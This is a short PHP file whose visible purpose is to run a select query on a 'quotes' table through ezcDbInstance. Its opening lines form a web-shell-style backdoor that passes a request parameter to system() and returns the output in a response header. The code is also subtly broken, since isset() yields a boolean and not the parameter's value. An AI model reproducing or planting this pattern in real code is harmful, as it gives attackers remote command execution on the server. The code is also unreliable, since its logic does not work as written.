<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

$db = ezcDbInstance::get();

$q = $db->createSelectQuery();
$q->select( '*' )->from( 'quotes' );

$stmt = $q->prepare();
$stmt->execute();

?>
